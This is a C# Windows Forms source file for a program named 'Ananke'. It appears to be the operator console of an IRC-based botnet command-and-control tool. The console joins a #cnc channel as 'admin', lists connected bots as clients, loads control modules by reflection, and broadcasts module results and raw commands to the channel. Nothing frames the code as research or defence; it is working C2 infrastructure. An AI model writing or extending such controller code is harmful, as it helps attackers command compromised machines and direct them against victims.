using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;
using Ananke.Modules;
using IRCLib;
using Message = IRCLib.Data.Message;

namespace Ananke {
    public partial class MainForm : Form {
        private Client _ircClient;
        private readonly Dictionary<string, IControlModule> _modules = new Dictionary<string, IControlModule>(); 

        public MainForm() {
            InitializeComponent();
        }

        /// <summary>
        ///     Thread safe method to write text to the console textbox
        /// </summary>
        /// <param name="text">Text to write</param>
        public void ConsoleLog(string text) {
            if(txtConsole.InvokeRequired) {
                Invoke((MethodInvoker)delegate {
                    ConsoleLog(text);
                });
            } else {
                txtConsole.AppendText(text);
            }
        }

        /// <summary>
        ///     Thread safe method to write a line to the console textbox
        /// </summary>
        /// <param name="text">Line to write</param>
        public void ConsoleLogLine(string text) {
            ConsoleLog(text + Environment.NewLine);
        }

        /// <summary>
        ///     Registers a new control module
        /// </summary>
        /// <param name="module">Module to add</param>
        public void RegisterModule(IControlModule module) {
            _modules[module.Identifier] = module;

            lstModules.Items.Add(module.Identifier);
        }

        private void MainForm_Load(object sender, EventArgs e) {
            ConnectForm dialog = new ConnectForm();

            if(dialog.ShowDialog() == DialogResult.OK) {
                // Dynamically load all control modules
                foreach(var type in Assembly.GetAssembly(typeof(MainForm)).GetTypes()) { // Get a list of all types
                    if(type.IsInterface || type.IsAbstract) continue; // Make sure it can be instantiated
                    if(type.GetInterface(typeof(IControlModule).FullName) == null) continue; // Check if it implements IControlModule
                    RegisterModule((IControlModule)Activator.CreateInstance(type));
                }

                // TODO: some sort of auth on the admin
                _ircClient = new Client(dialog.Host, new User("admin")); // Start a new IRC connection

                // Hook some events to print debug messages to the console
                _ircClient.Error += (o, args) => ConsoleLogLine(args.GetException().ToString());
                _ircClient.RawMessageSent += (o, args) => ConsoleLogLine(">> " + args.Message);
                _ircClient.RawMessageReceived += (o, args) => ConsoleLogLine("<< " + args.Message);

                _ircClient.SetHandler("001", OnServerReady); // Used to automatically join #cnc
                _ircClient.SetHandler("353", OnNamesReceived); // Populate the user list
                _ircClient.SetHandler("JOIN", OnUserJoin); // When a new user joins add it to the list
                _ircClient.SetHandler("QUIT", OnUserQuit); // and remove them from the list after they leave

                if(!_ircClient.Connect()) {
                    MessageBox.Show("Failed to connect");
                    Application.Exit();
                }
            } else {
                Application.Exit();
            }
        }

        private void OnServerReady(Client client, Message message) {
            client.SendRaw("JOIN #cnc");
        }

        private void OnUserQuit(Client client, Message message) {
            Invoke((MethodInvoker)delegate { // Thread safe way of modifying list items
                string name = message.Source.Name;
                lstClients.Items.Remove(name);
            });
        }

        private void OnUserJoin(Client client, Message message) {
            Invoke((MethodInvoker)delegate {
                string name = message.Source.Name;
                if(!lstClients.Items.Contains(name)) {
                    lstClients.Items.Add(name);
                }
            });
        }

        private void OnNamesReceived(Client client, Message message) {
            Invoke((MethodInvoker)delegate {
                lstClients.Items.Clear();
                string[] users = message.Parameters.Last().Split(' ');
                lstClients.Items.AddRange(users);
            });
        }

        private void textBox2_KeyPress(object sender, KeyPressEventArgs e) {
            if(e.KeyChar == (char)Keys.Enter) {
                _ircClient.SendRaw(textBox2.Text);
                textBox2.Text = "";
                e.Handled = true;
            }
        }

        private void btnActivateModule_Click(object sender, EventArgs e) {
            IControlModule module;
            if (_modules.TryGetValue(lstModules.SelectedItems[0].Text, out module)) { // Try and find the selected module
                string result = module.Activate();
                if (result != null) { // Send the result to IRC
                    _ircClient.SendRaw("PRIVMSG {0} :{1}", "#cnc", result);
                }
            } else {
                ConsoleLog("failed to find module");
            }
        }

        private void lstModules_SelectedIndexChanged(object sender, EventArgs e) {
            if(lstModules.SelectedItems.Count == 1) {
                btnActivateModule.Enabled = true;
                // enable other buttons etc
            } else {
                btnActivateModule.Enabled = false;
            }

        }

        private void lstClients_MouseDoubleClick(object sender, MouseEventArgs e) {
            int index = lstClients.IndexFromPoint(e.Location);
            if(index != ListBox.NoMatches) {
                string name = lstClients.Items[index].ToString();
                name = name.TrimStart('@');
                textBox2.Text = String.Format("PRIVMSG {0} :", name);
                textBox2.Focus();
            }
        }
    }
}
